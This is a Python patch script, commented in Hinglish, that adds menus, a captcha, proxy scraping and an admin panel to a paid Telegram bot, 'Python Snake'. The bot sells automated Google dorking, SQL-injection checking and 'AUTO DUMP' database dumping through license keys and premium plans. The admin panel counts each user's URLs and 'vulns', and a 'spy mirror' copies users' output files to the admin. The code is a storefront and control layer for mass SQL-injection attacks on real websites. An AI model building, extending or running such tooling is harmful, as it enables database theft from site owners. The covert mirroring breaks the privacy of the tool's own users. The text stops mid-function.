#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PYTHON SNAKE v23  —  UI + routing + captcha + advanced admin
============================================================
Kya fix karta hai:
  • v22 ke saare buttons DEAD the (router `v22_` prefix hi nahi padhta tha) -> ab live
  • /start par bada promo + "What Can Spidey Do?" text -> hata diya, chhota clean home
  • pehli baar /start -> random maths captcha -> phir buttons
  • naya menu: AUTO DUMP | PROXY SCRAPE | MANUAL DUMPING (Classic / New) | Redeem | Premium | Help | Contact
  • saare button fonts uniform (plain), koi small-caps/italic mix nahi
  • naya advanced admin panel: dashboard, users (extend/ban), keys, live runs,
    user vault, spy toggle, stats, engine defaults, proxy tools, broadcast, maintenance
  • admin mirror: user jo file banaye wo admin ko bhi jaati hai (vault + summary)

Usage:  python3 python_snake_v23.py bot_fixed.py
"""
import ast
import os
import re
import shutil
import sys
import py_compile
from datetime import datetime

MARK_START = "# ═══ PYTHON SNAKE v23 START ═══"
MARK_END = "# ═══ PYTHON SNAKE v23 END ═══"

BLOCK = r'''
# ═══ PYTHON SNAKE v23 START ═══
# ─────────────────────────────────────────────────────────────────────────────
#  PART A — state, captcha, clean home menu, plain fonts
# ─────────────────────────────────────────────────────────────────────────────
_V23_TAG = "V23-PYTHON-SNAKE"
_V23_USERS_FILE = os.path.join(DATA_DIR, "v23_users.json")
_V23_VERIFY_FILE = os.path.join(DATA_DIR, "v23_verified.json")
_V23_STATS_FILE = os.path.join(DATA_DIR, "v23_stats.json")
_V23_USERS: dict = {}
_V23_VERIFIED: set = set()
_V23_STATS: dict = {"days": {}, "by_user": {}}
_V23_READY = {"done": False, "dirty": 0}


def _v23_lj(path: str, default):
    try:
        if os.path.isfile(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception:
        pass
    return default


def _v23_sj(path: str, obj) -> None:
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception:
        pass


def _v23_init() -> None:
    if _V23_READY["done"]:
        return
    _V23_READY["done"] = True
    try:
        d = _v23_lj(_V23_USERS_FILE, {})
        if isinstance(d, dict):
            _V23_USERS.update({str(k): v for k, v in d.items() if isinstance(v, dict)})
    except Exception:
        pass
    try:
        for x in (_v23_lj(_V23_VERIFY_FILE, []) or []):
            _V23_VERIFIED.add(int(x))
    except Exception:
        pass
    try:
        st = _v23_lj(_V23_STATS_FILE, {})
        if isinstance(st, dict):
            _V23_STATS.update(st)
    except Exception:
        pass


def _v23_flush(force: bool = False) -> None:
    _V23_READY["dirty"] += 1
    if not force and _V23_READY["dirty"] % 8:
        return
    _v23_sj(_V23_USERS_FILE, _V23_USERS)
    _v23_sj(_V23_STATS_FILE, _V23_STATS)
    _v23_sj(_V23_VERIFY_FILE, sorted(_V23_VERIFIED))


def _v23_today() -> str:
    return datetime.now().strftime("%Y-%m-%d")


def _v23_touch(update, context=None) -> dict:
    """Har user ki basic info yaad rakho (admin panel ke liye)."""
    _v23_init()
    u = getattr(update, "effective_user", None)
    if u is None or not getattr(u, "id", None):
        return {}
    key = str(u.id)
    rec = _V23_USERS.get(key) or {"joined": time.time()}
    rec["name"] = (getattr(u, "full_name", "") or "")[:64]
    rec["uname"] = (getattr(u, "username", "") or "")[:32]
    rec["last"] = time.time()
    rec["starts"] = int(rec.get("starts") or 0)
    _V23_USERS[key] = rec
    _v23_flush()
    return rec


def _v23_is_verified(uid: int) -> bool:
    _v23_init()
    if is_admin(uid):
        return True
    return int(uid) in _V23_VERIFIED


def _v23_mark_verified(uid: int) -> None:
    _V23_VERIFIED.add(int(uid))
    _v23_flush(force=True)


# ── captcha ──────────────────────────────────────────────────────────────────
def _v23_captcha_new(context) -> tuple:
    a = random.randint(2, 9)
    b = random.randint(2, 9)
    op = random.choice(("+", "+", "×"))
    ans = a + b if op == "+" else a * b
    opts = {ans}
    while len(opts) < 4:
        d = ans + random.choice((-6, -4, -3, -2, -1, 1, 2, 3, 4, 6))
        if d > 0:
            opts.add(d)
    opts = sorted(opts)
    random.shuffle(opts)
    try:
        if context is not None:
            context.user_data["v23_cap"] = ans
    except Exception:
        pass
    q = ("🧮 <b>Verification</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
         "Bot use karne se pehle ye chhota sa sawaal solve karo:\n\n"
         "<b>%d %s %d = ?</b>" % (a, op, b))
    rows = [[InlineKeyboardButton(str(o), callback_data="v23_cap_%d" % o) for o in opts[:2]],
            [InlineKeyboardButton(str(o), callback_data="v23_cap_%d" % o) for o in opts[2:]]]
    rows.append([InlineKeyboardButton("🔄 Naya sawaal", callback_data="v23_cap_refresh")])
    return q, InlineKeyboardMarkup(rows)


async def _v23_send_captcha(update, context) -> None:
    q, kb = _v23_captcha_new(context)
    msg = getattr(update, "effective_message", None)
    if msg is not None:
        try:
            await msg.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
            return
        except Exception:
            pass
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=q,
                                       reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ── home menu (plain font, sirf kaam ke buttons) ─────────────────────────────
def _v23_kb_rows() -> list:
    rows = [
        [InlineKeyboardButton("🐍 AUTO DUMP — 1 TAP", callback_data="v22_auto")],
        [InlineKeyboardButton("🧅 PROXY SCRAPE + AUTO-FILL", callback_data="v23_proxy")],
        [InlineKeyboardButton("🧰 MANUAL DUMPING", callback_data="v23_manual")],
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="menu_redeem"),
         InlineKeyboardButton("🍷 PREMIUM", callback_data="menu_purchase")],
        [InlineKeyboardButton("📖 HOW TO USE", callback_data="menu_guide"),
         InlineKeyboardButton("☎️ CONTACT OWNER", callback_data="menu_help")],
    ]
    return rows


def _v23_main_kb(uid: int = 0):
    rows = _v23_kb_rows()
    try:
        if uid and is_admin(int(uid)):
            rows.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="v23a_home")])
    except Exception:
        pass
    return InlineKeyboardMarkup(rows)


def _v23_home_text(name: str = "") -> str:
    hi = ("Hi <b>%s</b>,\n" % name) if name else ""
    return ("🐍 <b>PYTHON SNAKE</b> 🐍\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            + hi +
            "Automated dorking • Deep parsing • Verified SQLi\n\n"
            "👇 Neeche se option chuno:")


async def _v23_send_home(update, context, edit: bool = False) -> None:
    uid = getattr(getattr(update, "effective_user", None), "id", 0) or 0
    name = (getattr(getattr(update, "effective_user", None), "first_name", "") or "")
    txt, kb = _v23_home_text(name), _v23_main_kb(uid)
    if edit:
        try:
            await update.callback_query.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
            return
        except Exception:
            pass
    msg = getattr(update, "effective_message", None)
    if msg is not None:
        try:
            await msg.reply_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
            return
        except Exception:
            pass
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=txt,
                                       reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ── /start ───────────────────────────────────────────────────────────────────
_v23_prev_start = start


async def start(update, context):   # noqa: F811
    _v23_init()
    uid = getattr(getattr(update, "effective_user", None), "id", 0) or 0
    _v23_touch(update, context)
    try:
        context.user_data.clear()
    except Exception:
        pass
    # naye user ko free trial (purane start jaisa hi)
    try:
        first_time = uid and uid not in all_user_ids and uid not in trial_users
        if uid:
            all_user_ids.add(uid)
        if first_time and not is_admin(uid) and uid not in authorized_users:
            trial_users[uid] = datetime.now()
            try:
                await update.effective_message.reply_text(
                    "🎁 <b>Free trial unlocked</b> — <code>%d min</code> ke liye saare features khol do.\n"
                    "Baad me plan lena ho to 🍷 PREMIUM dabao." % int(TRIAL_MINUTES),
                    parse_mode=ParseMode.HTML)
            except Exception:
                pass
        try:
            _save_users()
        except Exception:
            pass
    except Exception:
        pass
    if not _v23_is_verified(uid):
        await _v23_send_captcha(update, context)
        return MENU
    try:
        rec = _V23_USERS.get(str(uid)) or {}
        rec["starts"] = int(rec.get("starts") or 0) + 1
        _V23_USERS[str(uid)] = rec
        _v23_flush()
    except Exception:
        pass
    await _v23_send_home(update, context)
    return MENU


async def send_main_menu(update, context):   # noqa: F811
    """Purana bada promo text hata diya — ab chhota clean home."""
    _v23_touch(update, context)
    await _v23_send_home(update, context)


def make_main_menu():   # noqa: F811
    return _v23_main_kb(0)


# ── uniform (plain) fonts: engine panel + settings ───────────────────────────
def _v19_panel_kb():   # noqa: F811
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🐍 AUTO DUMP — 1 TAP", callback_data="v22_auto")],
        [InlineKeyboardButton("🧠 KEYWORDS", callback_data="v19_kw"),
         InlineKeyboardButton("🎯 DORKS", callback_data="v19_dork")],
        [InlineKeyboardButton("🧬 UNIVERSAL DORKS", callback_data="v22_uni")],
        [InlineKeyboardButton("🌍 DEEP PARSER", callback_data="v19_parse"),
         InlineKeyboardButton("🛡️ SQLI CHECKER", callback_data="v19_sqli")],
        [InlineKeyboardButton("🧅 PROXY SCAN", callback_data="v23_proxy"),
         InlineKeyboardButton("⚙️ SETTINGS", callback_data="v19_cfg")],
        [InlineKeyboardButton("🐍 LOGO / BRAND", callback_data="v22_brand"),
         InlineKeyboardButton("⬅️ BACK", callback_data="v23_home")],
    ])


def _v19_cfg_kb():   # noqa: F811
    try:
        cf = _v21_cfg()
        cdx = "ON" if cf.get("use_cdx") else "OFF"
        cc = "ON" if cf.get("use_cc") else "OFF"
        sig = cf.get("sig")
    except Exception:
        cdx = cc = "ON"
        sig = 14
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Fast", callback_data="v21_mode_fast"),
         InlineKeyboardButton("⚖️ Balanced", callback_data="v21_mode_balanced")],
        [InlineKeyboardButton("🌊 Deep", callback_data="v21_mode_deep"),
         InlineKeyboardButton("🔥 Max", callback_data="v21_mode_max")],
        [InlineKeyboardButton("24", callback_data="v19_thr_24"),
         InlineKeyboardButton("40", callback_data="v19_thr_40"),
         InlineKeyboardButton("60", callback_data="v19_thr_60"),
         InlineKeyboardButton("100", callback_data="v19_thr_100")],
        [InlineKeyboardButton("160", callback_data="v19_thr_160"),
         InlineKeyboardButton("Auto", callback_data="v19_thr_0")],
        [InlineKeyboardButton("Pages 1", callback_data="v19_pg_1"),
         InlineKeyboardButton("Pages 2", callback_data="v19_pg_2"),
         InlineKeyboardButton("Pages 3", callback_data="v19_pg_3")],
        [InlineKeyboardButton("Wayback " + cdx, callback_data="v21_cdx_toggle"),
         InlineKeyboardButton("CommonCrawl " + cc, callback_data="v21_cc_toggle")],
        [InlineKeyboardButton("Signature %s" % sig, callback_data="v21_sig_cycle")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="menu_v19")],
    ])


def _v23_classic_kb():
    """Purana (v21) poora menu — 'Classic' ke liye."""
    try:
        return _v22_prev_make_main_menu()
    except Exception:
        try:
            return make_main_menu()
        except Exception:
            return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="v23_home")]])

# ─────────────────────────────────────────────────────────────────────────────
#  PART B — manual dumping, proxy UI, advanced admin panel
# ─────────────────────────────────────────────────────────────────────────────
async def _v23_manual_ui(update, context) -> int:
    q = update.callback_query
    txt = ("🧰 <b>MANUAL DUMPING</b>\n"
           "━━━━━━━━━━━━━━━━━━━━━\n"
           "Do tarike hain — jo pasand ho wo chuno:\n\n"
           "🕰 <b>CLASSIC</b> — purana poora bot (saare purane buttons, keyword → dork → dump)\n"
           "🚀 <b>NEW LATEST</b> — naya v23 engine (auto dump, universal dorks, verified SQLi, proxy v2)")
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🕰 CLASSIC (purana menu)", callback_data="v23_classic")],
        [InlineKeyboardButton("🚀 NEW LATEST (v23 engine)", callback_data="v23_latest")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="v23_home")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass
    return MENU


async def _v23_proxy_ui(update, context) -> int:
    """Proxy scrape + auto-fill — pehle button dead tha, ab poora live progress."""
    q = update.callback_query
    uid = update.effective_user.id
    started = time.time()
    try:
        await q.edit_message_text(
            "🧅 <b>PROXY SCRAPE + AUTO-FILL</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⏳ Free proxy sources scrape ho rahe hain…\n"
            "<i>(10-60 sec — sources slow ho sakte hain)</i>",
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    st = {"scraped": 0, "checked": 0, "alive": 0, "pool": 0}
    last = {"t": 0.0}

    async def _prog(s: dict) -> None:
        now = time.time()
        if now - last["t"] < 2.5:
            return
        last["t"] = now
        try:
            await q.edit_message_text(
                "🧅 <b>PROXY SCAN — LIVE</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "📥 Scraped: <code>%s</code>\n"
                "🔍 Checked: <code>%s</code>\n"
                "✅ Alive: <code>%s</code>\n"
                "🗄 Pool: <code>%s</code>"
                % (format(s.get("scraped", 0), ","), format(s.get("checked", 0), ","),
                   format(s.get("alive", 0), ","), format(s.get("pool", 0), ",")),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    try:
        st = await _v22_proxy_scan(want=150, concurrency=220, progress=_prog, force=True)
    except Exception as exc:
        logger.warning("v23 proxy scan failed: %s", exc)
    good = []
    try:
        good = _v22_good_proxies(uid, limit=6)
    except Exception:
        pass
    ok_n = int(st.get("alive") or 0)
    pool_n = int(st.get("pool") or 0)
    best = int(st.get("best_ms") or 0)
    lines = [
        "🧅 <b>PROXY SCAN — DONE</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
        "📥 Scraped: <code>%s</code>" % format(int(st.get("scraped") or 0), ","),
        "🔍 Checked: <code>%s</code>" % format(int(st.get("checked") or 0), ","),
        "✅ Alive (naye): <code>%s</code>" % format(ok_n, ","),
        "🗄 Pool total: <code>%s</code>" % format(pool_n, ","),
        "⚡ Best speed: <code>%s ms</code>" % (best or "-"),
        "⏱ Time: <code>%.1fs</code>" % (time.time() - started),
        "",
    ]
    if pool_n:
        lines.append("✅ <b>Auto-fill ho gaya</b> — parser ab inhe use karega.")
        if good:
            lines.append("<i>Top: %s</i>" % ", ".join(g.replace("http://", "") for g in good[:4]))
    else:
        lines.append("⚠️ Is baar koi proxy alive nahi mila.")
        lines.append("👉 <b>Proxy ke bina bhi</b> parser chalega (safe engines mode).")
        lines.append("👉 Paid proxy: <code>/setpr host:port:user:pass</code>")
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔁 SCAN AGAIN", callback_data="v23_proxy")],
        [InlineKeyboardButton("📊 POOL STATUS", callback_data="v22_proxystat")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="v23_home")],
    ])
    try:
        await q.edit_message_text("\n".join(lines), reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass
    return MENU


# ── ADVANCED ADMIN PANEL ─────────────────────────────────────────────────────
def _v23_u_rec(uid) -> dict:
    _v23_init()
    return _V23_USERS.get(str(uid)) or {}


def _v23_plan_text(uid: int) -> str:
    try:
        if uid in authorized_users:
            info = authorized_users[uid]
            exp = info.get("expires")
            left = exp - datetime.now() if exp else None
            if left and left.total_seconds() > 0:
                return "%s • %s bache" % (info.get("plan", "plan"), _v23_dur(left))
            return "expired (%s)" % info.get("plan", "?")
    except Exception:
        pass
    try:
        if uid in trial_users:
            t = trial_status(uid)
            return "trial %s" % t
    except Exception:
        pass
    return "no plan"


def _v23_dur(td) -> str:
    try:
        sec = int(td.total_seconds())
    except Exception:
        return "?"
    if sec <= 0:
        return "0m"
    d, rem = divmod(sec, 86400)
    h, rem = divmod(rem, 3600)
    m = rem // 60
    if d:
        return "%dd %dh" % (d, h)
    if h:
        return "%dh %dm" % (h, m)
    return "%dm" % m


def _v23_dash_text() -> str:
    _v23_init()
    total = len(set(list(all_user_ids) + [int(k) for k in _V23_USERS.keys()]))
    now = time.time()
    active24 = sum(1 for v in _V23_USERS.values() if (now - float(v.get("last") or 0)) < 86400)
    lic = 0
    try:
        for uid_, info in list(authorized_users.items()):
            exp = info.get("expires")
            if exp and exp > datetime.now():
                lic += 1
    except Exception:
        pass
    banned = len(banned_users)
    keys = len(license_keys)
    keys_free = 0
    try:
        keys_free = sum(1 for v in license_keys.values() if not v.get("used_by"))
    except Exception:
        pass
    try:
        pool = len(_v22_proxy_load())
    except Exception:
        pool = len(global_proxy_pool or [])
    try:
        runs = len(_V19_STOP)
    except Exception:
        runs = len(stop_events or {})
    today = _V23_STATS.get("days", {}).get(_v23_today(), {})
    return ("👑 <b>ADMIN — DASHBOARD</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "👥 Users: <code>%s</code> • 🟢 active 24h: <code>%s</code>\n"
            "💎 Licensed: <code>%s</code> • 🚫 banned: <code>%s</code>\n"
            "🔑 Keys: <code>%s</code> (<code>%s</code> free)\n"
            "🧅 Proxy pool: <code>%s</code> • 🏃 Live runs: <code>%s</code>\n\n"
            "📅 <b>Aaj:</b> runs <code>%s</code> • URLs <code>%s</code> • vulns <code>%s</code>\n"
            "🕵️ Spy mirror: <b>%s</b>") % (
        format(total, ","), format(active24, ","), format(lic, ","), format(banned, ","),
        format(keys, ","), format(keys_free, ","), format(pool, ","), format(runs, ","),
        format(int(today.get("runs") or 0), ","), format(int(today.get("urls") or 0), ","),
        format(int(today.get("vulns") or 0), ","),
        "ON" if _v9_is_spy_enabled() else "OFF")


def make_admin_menu():   # noqa: F811
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 DASHBOARD", callback_data="v23a_home")],
        [InlineKeyboardButton("👥 USERS", callback_data="v23a_users_0"),
         InlineKeyboardButton("🔑 KEYS", callback_data="v23a_keys")],
        [InlineKeyboardButton("🏃 LIVE RUNS", callback_data="v23a_live"),
         InlineKeyboardButton("📂 USER VAULT", callback_data="uv_home_0")],
        [InlineKeyboardButton("🕵️ SPY ON/OFF", callback_data="admin_spytoggle"),
         InlineKeyboardButton("📈 STATS", callback_data="v23a_stats")],
        [InlineKeyboardButton("🧅 PROXIES", callback_data="v23a_proxy"),
         InlineKeyboardButton("⚙️ ENGINE", callback_data="v23a_engine")],
        [InlineKeyboardButton("📣 BROADCAST", callback_data="admin_broadcast"),
         InlineKeyboardButton("🚫 BANS", callback_data="admin_banlist")],
        [InlineKeyboardButton("☢️ KILL ALL TASKS", callback_data="admin_killall")],
        [InlineKeyboardButton("⬅️ MAIN MENU", callback_data="v23_home")],
    ])


def _v23a_users_view(page: int = 0):
    _v23_init()
    items = sorted(_V23_USERS.items(),
                   key=lambda kv: float(kv[1].get("last") or 0), reverse=True)
    per = 6
    pages = max(1, (len(items) + per - 1) // per)
    page = max(0, min(page, pages - 1))
    chunk = items[page * per:(page + 1) * per]
    rows, lines = [], []
    for uid_s, rec in chunk:
        try:
            uid = int(uid_s)
        except Exception:
            continue
        nm = (rec.get("name") or "user")[:18]
        un = ("@" + rec["uname"]) if rec.get("uname") else ""
        plan = _v23_plan_text(uid)
        lines.append("• <b>%s</b> %s <code>%s</code> — %s" % (nm, un, uid, plan))
        rows.append([InlineKeyboardButton("%s (%s)" % (nm, uid), callback_data="v23a_u_%d" % uid)])
    if not lines:
        lines.append("<i>Abhi koi user record nahi (naye users /start karenge to yahan aayenge).</i>")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data="v23a_users_%d" % (page - 1)))
    nav.append(InlineKeyboardButton("%d/%d" % (page + 1, pages), callback_data="v23a_home"))
    if page < pages - 1:
        nav.append(InlineKeyboardButton("➡️", callback_data="v23a_users_%d" % (page + 1)))
    rows.append(nav)
    rows.append([InlineKeyboardButton("⬅️ ADMIN PANEL", callback_data="v23a_home")])
    txt = ("👥 <b>USERS</b> (%s total)\n━━━━━━━━━━━━━━━━━━━━━\n%s"
           % (format(len(items), ","), "\n".join(lines)))
    return txt, InlineKeyboardMarkup(rows)


async def _v23a_user_detail(update, context, uid: int) -> int:
    q = update.callback_query
    rec = _v23_u_rec(uid)
    name = rec.get("name") or ""
    uname = rec.get("uname") or ""
    if not name:
        try:
            ch = await context.bot.get_chat(uid)
            name = ch.full_name or ""
            uname = ch.username or ""
            rec.update({"name": name, "uname": uname})
            _V23_USERS[str(uid)] = rec
        except Exception:
            pass
    last = rec.get("last")
    last_s = datetime.fromtimestamp(float(last)).strftime("%d %b %H:%M") if last else "-"
    ban = uid in banned_users
    txt = ("👤 <b>USER DETAIL</b>\n"
           "━━━━━━━━━━━━━━━━━━━━━\n"
           "👤 Name: <b>%s</b>\n"
           "🔗 Username: %s\n"
           "🆔 ID: <code>%s</code>\n"
           "💎 Plan: <b>%s</b>\n"
           "🚫 Banned: <b>%s</b>\n"
           "🕒 Last seen: <code>%s</code>\n"
           "▶️ Starts: <code>%s</code> • Runs: <code>%s</code>\n"
           "🌍 URLs: <code>%s</code> • 🛡️ Vulns: <code>%s</code>") % (
        name or "-", ("@" + uname) if uname else "-", uid, _v23_plan_text(uid),
        "YES" if ban else "no", last_s,
        format(int(rec.get("starts") or 0), ","), format(int(rec.get("runs") or 0), ","),
        format(int(rec.get("urls") or 0), ","), format(int(rec.get("vulns") or 0), ","))
    rows = [
        [InlineKeyboardButton("➕ 1 DAY", callback_data="v23a_add_%d_1" % uid),
         InlineKeyboardButton("➕ 7 DAYS", callback_data="v23a_add_%d_7" % uid),
         InlineKeyboardButton("➕ 30 DAYS", callback_data="v23a_add_%d_30" % uid)],
        [InlineKeyboardButton("🎁 GIVE PLAN", callback_data="v23a_plan_%d" % uid),
         InlineKeyboardButton("📂 FILES", callback_data="uv_u_%d_A_0" % uid)],
    ]
    if ban:
        rows.append([InlineKeyboardButton("✅ UNBAN", callback_data="v23a_unban_%d" % uid)])
    else:
        rows.append([InlineKeyboardButton("🚫 BAN", callback_data="v23a_ban_%d" % uid)])
    rows.append([InlineKeyboardButton("⬅️ USERS", callback_data="v23a_users_0")])
    try:
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    return MENU


def _v23_grant(uid: int, days: int) -> str:
    try:
        base = datetime.now()
        if uid in authorized_users:
            exp = authorized_users[uid].get("expires")
            if exp and exp > base:
                base = exp
        authorized_users[uid] = {"plan": "%d day add" % days,
                                 "expires": base + timedelta(days=days),
                                 "granted_by": "admin"}
        try:
            _save_users()
        except Exception:
            pass
        return "✅ +%d din" % days
    except Exception as exc:
        return "❌ %s" % exc


def _v23a_stats_view():
    _v23_init()
    days = _V23_STATS.get("days", {})
    today = days.get(_v23_today(), {})
    week = {}
    for k, v in days.items():
        for f in ("runs", "urls", "vulns", "files"):
            week[f] = week.get(f, 0) + int(v.get(f) or 0)
    by_u = sorted(_V23_STATS.get("by_user", {}).items(),
                  key=lambda kv: int((kv[1] or {}).get("urls") or 0), reverse=True)[:8]
    lines = []
    for uid_s, d in by_u:
        nm = (_V23_USERS.get(str(uid_s), {}) or {}).get("name") or uid_s
        lines.append("• <b>%s</b> — URLs <code>%s</code> • vulns <code>%s</code>"
                     % (nm[:16], format(int(d.get("urls") or 0), ","),
                        format(int(d.get("vulns") or 0), ",")))
    txt = ("📈 <b>ENGINE STATS</b>\n"
           "━━━━━━━━━━━━━━━━━━━━━\n"
           "📅 <b>Aaj:</b> runs <code>%s</code> • URLs <code>%s</code> • vulns <code>%s</code>\n"
           "🗓 <b>Total:</b> runs <code>%s</code> • URLs <code>%s</code> • vulns <code>%s</code>\n\n"
           "🏆 <b>Top users</b>\n%s") % (
        format(int(today.get("runs") or 0), ","), format(int(today.get("urls") or 0), ","),
        format(int(today.get("vulns") or 0), ","),
        format(int(week.get("runs") or 0), ","), format(int(week.get("urls") or 0), ","),
        format(int(week.get("vulns") or 0), ","),
        "\n".join(lines) or "<i>abhi data nahi</i>")
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 REFRESH", callback_data="v23a_stats")],
                               [InlineKeyboardButton("⬅️ ADMIN PANEL", callback_data="v23a_home")]])
    return txt, kb


def _v23a_live_view():
    rows, lines = [], []
    seen = set()
    try:
        for uid_ in list(_V19_STOP.keys()):
            seen.add(int(uid_))
    except Exception:
        pass
    try:
        for uid_ in list(stop_events.keys()):
            seen.add(int(uid_))
    except Exception:
        pass
    for uid in sorted(seen):
        nm = (_V23_USERS.get(str(uid), {}) or {}).get("name") or str(uid)
        lines.append("• <b>%s</b> <code>%s</code>" % (nm[:16], uid))
        rows.append([InlineKeyboardButton("🛑 STOP %s" % nm[:14], callback_data="v23a_stop_%d" % uid)])
    if not lines:
        lines.append("<i>Abhi koi run nahi chal raha.</i>")
    rows.append([InlineKeyboardButton("🧹 STOP ALL RUNS", callback_data="admin_killall")])
    rows.append([InlineKeyboardButton("⬅️ ADMIN PANEL", callback_data="v23a_home")])
    return ("🏃 <b>LIVE RUNS</b> (%d)\n━━━━━━━━━━━━━━━━━━━━━\n%s"
            % (len(seen), "\n".join(lines))), InlineKeyboardMarkup(rows)


def _v23a_engine_kb():
    try:
        cf = _v21_cfg()
        t, p, m = cf.get("threads"), cf.get("pages"), cf.get("mode")
    except Exception:
        t, p, m = "?", "?", "?"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Fast", callback_data="v21_mode_fast"),
         InlineKeyboardButton("⚖️ Balanced", callback_data="v21_mode_balanced")],
        [InlineKeyboardButton("🌊 Deep", callback_data="v21_mode_deep"),
         InlineKeyboardButton("🔥 Max", callback_data="v21_mode_max")],
        [InlineKeyboardButton("24", callback_data="v19_thr_24"),
         InlineKeyboardButton("40", callback_data="v19_thr_40"),
         InlineKeyboardButton("60", callback_data="v19_thr_60"),
         InlineKeyboardButton("100", callback_data="v19_thr_100"),
         InlineKeyboardButton("160", callback_data="v19_thr_160")],
        [InlineKeyboardButton("Pages 2", callback_data="v19_pg_2"),
         InlineKeyboardButton("Pages 3", callback_data="v19_pg_3")],
        [InlineKeyboardButton("⬅️ ADMIN PANEL", callback_data="v23a_home")],
    ])


async def _v23a_handle(update, context, data: str) -> int:
    q = update.callback_query
    uid = update.effective_user.id
    if not is_admin(uid):
        try:
            await q.answer("❌ Admin only", show_alert=True)
        except Exception:
            pass
        return MENU
    try:
        await q.answer()
    except Exception:
        pass

    def _edit(txt, kb=None):
        return q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)

    if data in ("v23a_home", "admin_panel"):
        try:
            await _edit(_v23_dash_text(), make_admin_menu())
        except Exception:
            pass
        return MENU
    if data.startswith("v23a_users_"):
        try:
            page = int(data.rsplit("_", 1)[1])
        except Exception:
            page = 0
        txt, kb = _v23a_users_view(page)
        try:
            await _edit(txt, kb)
        except Exception:
            pass
        return MENU
    if data.startswith("v23a_u_"):
        try:
            target = int(data.split("v23a_u_", 1)[1])
        except Exception:
            return MENU
        return await _v23a_user_detail(update, context, target)
    if data.startswith("v23a_add_"):
        _, _, rest = data.partition("v23a_add_")
        try:
            t_s, d_s = rest.split("_", 1)
            target, days = int(t_s), int(d_s)
        except Exception:
            return MENU
        msg = _v23_grant(target, days)
        try:
            await q.answer(msg, show_alert=False)
        except Exception:
            pass
        return await _v23a_user_detail(update, context, target)
    if data.startswith("v23a_plan_"):
        try:
            target = int(data.split("v23a_plan_", 1)[1])
        except Exception:
            return MENU
        rows = [[InlineKeyboardButton("%s %s" % (emoji, label), callback_data="v23a_give_%d_%s" % (target, code))]
                for label, code, emoji, _ in PLANS]
        rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="v23a_u_%d" % target)])
        try:
            await _edit("🎁 <b>PLAN CHUNO</b> — user <code>%d</code>" % target, InlineKeyboardMarkup(rows))
        except Exception:
            pass
        return MENU
    if data.startswith("v23a_give_"):
        _, _, rest = data.partition("v23a_give_")
        try:
            t_s, code = rest.split("_", 1)
            target = int(t_s)
            label, emoji, delta = PLAN_MAP[code]
        except Exception:
            return MENU
        try:
            base = datetime.now()
            if target in authorized_users:
                exp = authorized_users[target].get("expires")
                if exp and exp > base:
                    base = exp
            authorized_users[target] = {"plan": label, "expires": base + delta,
                                        "granted_by": "admin"}
            try:
                _save_users()
            except Exception:
                pass
            await q.answer("✅ %s diya" % label)
        except Exception as exc:
            try:
                await q.answer("❌ %s" % exc, show_alert=True)
            except Exception:
                pass
        return await _v23a_user_detail(update, context, target)
    if data.startswith("v23a_ban_"):
        try:
            target = int(data.split("v23a_ban_", 1)[1])
            banned_users.add(target)
            authorized_users.pop(target, None)
            try:
                _save_users()
            except Exception:
                pass
            await q.answer("🚫 Banned")
        except Exception:
            return MENU
        return await _v23a_user_detail(update, context, target)
    if data.startswith("v23a_unban_"):
        try:
            target = int(data.split("v23a_unban_", 1)[1])
            banned_users.discard(target)
            try:
                _save_users()
            except Exception:
                pass
            await q.answer("✅ Unbanned")
        except Exception:
            return MENU
        return await _v23a_user_detail(update, context, target)
    if data == "v23a_keys":
        try:
            await _edit("🔑 <b>KEYS</b>\n━━━━━━━━━━━━━━━━━━━━━\nNaya key banao ya list dekho:",
                        InlineKeyboardMarkup([
                            [InlineKeyboardButton("➕ GENERATE NEW KEY", callback_data="admin_genkey")],
                            [InlineKeyboardButton("📝 LIST / REVOKE KEYS", callback_data="admin_listkeys")],
                            [InlineKeyboardButton("⬅️ ADMIN PANEL", callback_data="v23a_home")],
                        ]))
        except Exception:
            pass
        return MENU
    if data == "v23a_live":
        txt, kb = _v23a_live_view()
        try:
            await _edit(txt, kb)
        except Exception:
            pass
        return MENU
    if data.startswith("v23a_stop_"):
        try:
            target = int(data.split("v23a_stop_", 1)[1])
            ev = None
            try:
